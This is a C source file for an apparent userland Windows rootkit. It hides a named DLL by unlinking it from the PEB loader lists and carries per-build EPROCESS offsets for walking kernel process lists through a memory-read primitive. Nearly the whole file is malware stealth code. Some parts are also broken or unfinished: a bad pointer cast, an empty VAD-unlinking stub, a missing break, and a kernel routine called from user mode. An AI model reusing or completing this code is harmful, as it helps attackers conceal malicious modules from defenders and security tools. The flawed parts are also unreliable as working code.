#include "rku.h"

unsigned char dll_name[] = "inf.dll";
unsigned short sdll_name[] = L"inf.dll";
unsigned short spath_dll[] = L"C:\\coding\\rootkit-userland\\inf.dll";

int UnlinkPEBdll(void)
{
	UNICODE_STRING b;
	PEB *pPeb = (PEB *)__readgsqword(0x60);
	PEB_LDR_DATA *Ldr = pPeb->Ldr;
	LIST_ENTRY *ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY *pStartListEntry = ModuleList->Flink;
	LIST_ENTRY *prev_entry = pStartListEntry;
	WCHAR mystr[MAX_PATH] = {0};
	WCHAR substr[MAX_PATH] = {0};
	for (LIST_ENTRY *pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
	{

		MY_LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(pListEntry, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		wprintf(entry->FullDllName.Buffer);
		printf("\n");
		if (custom_wcscmp(spath_dll, entry->FullDllName.Buffer) == 0)
		{
			printf("[+] Found and hid the dll\n");
			entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
			entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
			entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
			entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
			entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;
			entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
			entry->HashTableEntry.Blink->Flink = entry->HashTableEntry.Flink;
			entry->HashTableEntry.Flink->Blink = entry->HashTableEntry.Blink;
		}
	}
	return 0;
}

fpNtQuerySystemInformation query;
// fpReadVirtual ReadVirtual;

int NtQSI(int query_class, void **_buf)
{
	void *buf = NULL;
	DWORD b_sz = 0;
	NTSTATUS status = query(query_class, buf, b_sz, &b_sz);
	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buf, 0, MEM_RELEASE);

		buf = VirtualAlloc(NULL, b_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(query_class, buf, b_sz, &b_sz);
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buf, 0, MEM_RELEASE);
		return 1;
	}
	*_buf = buf;
	return 0;
}

ULONG GetKernelModule(unsigned char *name)
{

	unsigned char *buf;
	if (NtQSI(SystemModuleInformation, (void **)&buf))
	{
		printf("NtQSI let us down\n");
		return 0;
	}
	PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)buf;
	for (int i = 0; i < modules->NumberOfModules; ++i)
	{
		unsigned char *module_name = (modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName;
		if (!strcmp(module_name, name))
		{
			ULONG result = (ULONG)modules->Modules[i].ImageBase;
			VirtualFree(buf, 0, MEM_RELEASE);
			return result;
		}
	}
	VirtualFree(buf, 0, MEM_RELEASE);
	return 0;
}
ULONG EPImageFileName, EPUniqueProcessId, EPSectionBaseAddress, EPActiveProcessLinks;
ULONG systembase;
void FixOffsets()
{
	systembase = GetKernelModule("ntoskrnl.exe");
	NTSTATUS(WINAPI * RtlGetVersion)
	(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;

	*(FARPROC *)&RtlGetVersion = _GetProcAddressNative("RtlGetVersion");
	DWORD build = 0;
	if (NULL != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof(osInfo);
		RtlGetVersion(&osInfo);
		build = osInfo.dwBuildNumber;
	}
	switch (build) // some offsets might be wrong, check it yourself it if does not work
	{
	case 22000: // WIN11_21H2
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19045: // WIN10_21H2
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
	case 19044: // WIN10_21H2
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19043: // WIN10_21H1
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19042: // WIN10_20H2
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19041: // WIN10_20H1
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 18363: // WIN10_19H2
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c8;
		EPActiveProcessLinks = 0x2f0;
		break;
	case 18362: // WIN10_19H1
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c8;
		EPActiveProcessLinks = 0x2f0;
		break;
	case 17763: // WIN10_RS5
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 17134: // WIN10_RS4
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 16299: // WIN10_RS3
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 15063: // WIN10_RS2
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 14393: // WIN10_RS1
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2f0;
		break;
	case 10586: // WIN10_TH2
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2f0;
		break;
	default:
		// check https://www.vergiliusproject.com/kernels/x64/
		exit(0);
		break;
	}
}

HANDLE SFGetEProcess(int pid)
{
	unsigned char *buf;
	if (NtQSI(SystemHandleInformation, (void **)&buf))
	{
		printf("NtQSI let us down\n");
		return 0;
	}
	SYSTEM_HANDLE_INFORMATION *handle_info = (SYSTEM_HANDLE_INFORMATION *)(&buf);

	for (size_t i = 0; i < handle_info->Count; i++)
		if (pid == handle_info->Handle[i].OwnerPid && 7 == handle_info->Handle[i].ObjectType)
		{
			return (handle_info->Handle[i].ObjectPointer);
		}
	return 0;
}

uint64_t GetEProcess(int pid)
{
	LIST_ENTRY ActiveProcessLinks;
	// 7d8
	ReadVirtual(systembase, SFGetEProcess(4) + EPActiveProcessLinks, (uint8_t *)&ActiveProcessLinks, sizeof(ActiveProcessLinks));

	while (1)
	{
		uint64_t next_pid = 0;
		char buffer[0xFFFF];
		uint64_t next_link = (uint64_t)(ActiveProcessLinks.Flink);
		uint64_t next = next_link - EPActiveProcessLinks;
		ReadVirtual(systembase, next + EPUniqueProcessId, (uint8_t *)&next_pid, sizeof(next_pid));
		ReadVirtual(systembase, next + EPImageFileName, (uint8_t *)&buffer, sizeof(buffer));
		ReadVirtual(systembase, next + EPActiveProcessLinks, (uint8_t *)&ActiveProcessLinks, sizeof(ActiveProcessLinks));

		if (next_pid == pid)
		{
			return next;
		}
		if (next_pid == 4 || next_pid == 0)
			break;
	}
	return 0;
}

int UnlinkVADdll()
{
	PEB *pPeb = (PEB *)__readgsqword(0x60);
	PEB_LDR_DATA *Ldr = pPeb->Ldr;
	LIST_ENTRY *ModuleList = &Ldr->InMemoryOrderModuleList;
	PMMVAD pVadRoot = NULL;
	// PEPROCESS pEprocess = NULL;
	// pEprocess = GetEprocess();
}
typedef LONG (*fpPsLookupProcessByProcessId) (HANDLE ProcessId, void *Process);
int main()
{
	unsigned char buf[2048];
	query = (fpNtQuerySystemInformation)_GetProcAddressNative("NtQuerySystemInformation");
	HMODULE ntos = LoadLibraryA("ntoskrnl.exe");
	fpPsLookupProcessByProcessId pelk = GetProcAddress(ntos, "PsLookupProcessByProcessId");
	pelk(GetCurrentProcessId(), buf);
	LoadLibraryW(sdll_name);
	printf("waiting for input to hide the dll\n");
	// getchar();

	UnlinkPEBdll();
	while (1)
	{
		printf("Graceful exiting\n");
		Sleep(1000);
	}
}